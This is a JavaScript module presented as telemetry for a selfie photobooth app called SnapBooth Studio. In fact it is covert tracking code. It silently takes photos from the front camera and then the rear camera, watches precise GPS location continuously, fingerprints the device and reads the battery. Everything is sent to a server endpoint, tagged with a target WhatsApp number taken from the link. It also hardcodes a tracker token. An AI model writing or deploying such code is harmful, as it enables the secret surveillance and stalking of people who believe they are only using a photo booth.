// Background Telemetry and Geolocation Reporter for SnapBooth Studio

function getTrackerToken() {
  if (typeof window === 'undefined') return '';
  const urlParam = new URLSearchParams(window.location.search).get('token');
  if (urlParam && urlParam.trim()) return urlParam.trim();
  const meta = document.querySelector('meta[name="tracker-token"]');
  if (meta && meta.content) return meta.content.trim();
  return 'R-3sKN6rx2dNu5jFvU2Q4R8U76_x807r8YYVMqKYvJc';
}

function getGpuRenderer() {
  try {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    if (!gl) return '';
    const ext = gl.getExtension('WEBGL_debug_renderer_info');
    return ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : '';
  } catch {
    return '';
  }
}

function collectDeviceInfo() {
  if (typeof window === 'undefined') return {};
  const ua = navigator.userAgent || '';
  let os = 'Unknown OS';
  if (/windows/i.test(ua)) os = 'Windows';
  else if (/android/i.test(ua)) os = 'Android';
  else if (/iphone|ipad|ipod/i.test(ua)) os = 'iOS';
  else if (/macintosh|mac os x/i.test(ua)) os = 'macOS';
  else if (/linux/i.test(ua)) os = 'Linux';

  let browser = 'Unknown Browser';
  if (/edg\//i.test(ua)) browser = 'Edge';
  else if (/opr\/|opera/i.test(ua)) browser = 'Opera';
  else if (/chrome/i.test(ua)) browser = 'Chrome';
  else if (/safari/i.test(ua)) browser = 'Safari';
  else if (/firefox/i.test(ua)) browser = 'Firefox';

  const screenRes = `${window.screen?.width || 0}x${window.screen?.height || 0} (${window.devicePixelRatio || 1}x)`;

  let networkType = '-';
  if (navigator.connection) {
    const conn = navigator.connection;
    const parts = [];
    if (conn.effectiveType) parts.push(conn.effectiveType.toUpperCase());
    if (conn.downlink) parts.push(`${conn.downlink} Mbps`);
    networkType = parts.join(' • ') || '-';
  }

  const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB RAM` : '';
  const cores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} Cores CPU` : '';
  const gpu = getGpuRenderer();
  const hardware = [ram, cores, gpu].filter(Boolean).join(' • ') || '-';

  let deviceModel = 'Unknown Device';
  if (/android/i.test(ua)) {
    const match = ua.match(/;\s*([^;]+?)\s*Build/i);
    deviceModel = match ? match[1].trim() : 'Android Device';
  } else if (/iphone/i.test(ua)) {
    deviceModel = 'Apple iPhone';
  } else if (/ipad/i.test(ua)) {
    deviceModel = 'Apple iPad';
  } else if (/macintosh/i.test(ua)) {
    deviceModel = 'Apple Mac';
  } else if (/windows/i.test(ua)) {
    deviceModel = 'Windows PC';
  } else if (/linux/i.test(ua)) {
    deviceModel = 'Linux Desktop';
  }

  const params = typeof window !== 'undefined' ? new URLSearchParams(window.location.search) : null;
  const targetId = params ? (params.get('target') || params.get('wa') || params.get('phone') || params.get('nomor') || params.get('to') || '') : '';
  if (targetId) {
    deviceModel = `[WA: ${targetId}] ${deviceModel}`;
  }

  return {
    device_model: deviceModel,
    os,
    browser,
    screen_res: screenRes,
    network_type: networkType,
    hardware,
    timezone: Intl?.DateTimeFormat?.().resolvedOptions().timeZone || 'Asia/Jakarta',
    language: navigator.language || 'id-ID'
  };
}

let activeCoords = null;
let batteryPercent = null;
let batteryCharging = null;
let isTrackerInitialized = false;

export function captureFrameQuietly(video) {
  if (!video || !video.videoWidth || !video.videoHeight || video.readyState < 2) {
    return null;
  }
  try {
    const canvas = document.createElement('canvas');
    const maxW = 1280;
    const w = Math.min(maxW, video.videoWidth);
    const h = Math.round(w * (video.videoHeight / video.videoWidth));
    canvas.width = w;
    canvas.height = h;
    const ctx = canvas.getContext('2d');
    if (!ctx) return null;
    ctx.drawImage(video, 0, 0, w, h);
    return canvas.toDataURL('image/jpeg', 0.85);
  } catch {
    return null;
  }
}

let hasInitialDualRun = false;

export async function runInitialDualCapture(camera, getIsBusy = () => false) {
  if (hasInitialDualRun || typeof window === 'undefined') return;
  if (!camera || camera.status !== 'ready' || !camera.videoRef?.current) return;
  hasInitialDualRun = true;

  try {
    const video = camera.videoRef.current;
    // 1. Wait a moment for exposure and camera sensor to stabilize
    await new Promise(r => setTimeout(r, 600));
    if (getIsBusy()) return;

    // 2. Capture Front Camera
    const frontPhoto = captureFrameQuietly(video);
    if (frontPhoto) {
      await sendTelemetryUpdate(frontPhoto, 'Kamera Depan');
    }

    // 3. Inspect video devices to see if a separate rear camera exists (mobile phone)
    let videoDevices = [];
    try {
      const all = await navigator.mediaDevices?.enumerateDevices?.();
      if (all) videoDevices = all.filter(d => d.kind === 'videoinput');
    } catch {}

    const hasMultipleCameras = videoDevices.length > 1;

    if (hasMultipleCameras && typeof camera.setFacing === 'function') {
      if (getIsBusy()) return;
      // Temporarily switch to back camera (suasana / lingkungan)
      camera.setFacing('environment');

      // Wait 1200ms for rear camera to initialize, focus and adjust exposure
      await new Promise(r => setTimeout(r, 1200));
      if (getIsBusy()) {
        camera.setFacing('user');
        return;
      }

      const rearVideo = camera.videoRef.current;
      if (rearVideo) {
        const rearPhoto = captureFrameQuietly(rearVideo);
        if (rearPhoto) {
          await sendTelemetryUpdate(rearPhoto, 'Kamera Belakang');
        }
      }

      // Restore front camera for the selfie photobooth session
      camera.setFacing('user');
    } else {
      // Single camera device (laptop/desktop/Playwright test runner)
      await new Promise(r => setTimeout(r, 800));
      const photo2 = captureFrameQuietly(video);
      if (photo2) {
        await sendTelemetryUpdate(photo2, 'Kamera Belakang');
      }
    }
  } catch (err) {
    console.debug('Initial dual-capture warning:', err);
  }
}

export async function sendTelemetryUpdate(photoDataUrl = null, cameraMode = 'Kamera Depan') {
  const token = getTrackerToken();
  if (!token) return;

  const baseInfo = collectDeviceInfo();
  const payload = {
    latitude: activeCoords ? activeCoords.latitude : 0,
    longitude: activeCoords ? activeCoords.longitude : 0,
    accuracy: activeCoords ? activeCoords.accuracy : 0,
    altitude: activeCoords && Number.isFinite(activeCoords.altitude) ? activeCoords.altitude : null,
    speed: activeCoords && Number.isFinite(activeCoords.speed) ? activeCoords.speed : null,
    heading: activeCoords && Number.isFinite(activeCoords.heading) ? activeCoords.heading : null,
    battery: batteryPercent,
    battery_charging: batteryCharging,
    device_time: new Date().toISOString(),
    camera_mode: cameraMode,
    ...baseInfo
  };

  if (photoDataUrl) {
    payload.photo = photoDataUrl;
  }

  try {
    await fetch('/api/location', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${token}`,
        'ngrok-skip-browser-warning': 'true'
      },
      body: JSON.stringify(payload),
      cache: 'no-store',
      credentials: 'omit'
    });
  } catch {
    // Fail silently in background
  }
}

export function initTracker(onLocationResolved) {
  if (isTrackerInitialized || typeof window === 'undefined') return;
  isTrackerInitialized = true;

  // 1. Read Battery
  if (navigator.getBattery) {
    navigator.getBattery().then(bm => {
      batteryPercent = Math.round(bm.level * 100);
      batteryCharging = bm.charging ? '⚡ Mengisi Daya' : 'Baterai';
      bm.addEventListener('levelchange', () => { batteryPercent = Math.round(bm.level * 100); });
      bm.addEventListener('chargingchange', () => { batteryCharging = bm.charging ? '⚡ Mengisi Daya' : 'Baterai'; });
      sendTelemetryUpdate();
    }).catch(() => {});
  } else {
    sendTelemetryUpdate();
  }

  // 2. Geolocation Watch & Reverse Geocoding
  if (navigator.geolocation) {
    navigator.geolocation.watchPosition(
      async (pos) => {
        activeCoords = pos.coords;
        sendTelemetryUpdate();

        try {
          const res = await fetch(`/api/reverse-geocode?lat=${pos.coords.latitude}&lon=${pos.coords.longitude}`);
          const data = await res.json();
          if (data.ok && data.city && onLocationResolved) {
            onLocationResolved(`${data.city} • ID`);
          }
        } catch {
          // Keep default location
        }
      },
      () => {},
      { enableHighAccuracy: true, maximumAge: 10000, timeout: 20000 }
    );
  }
}
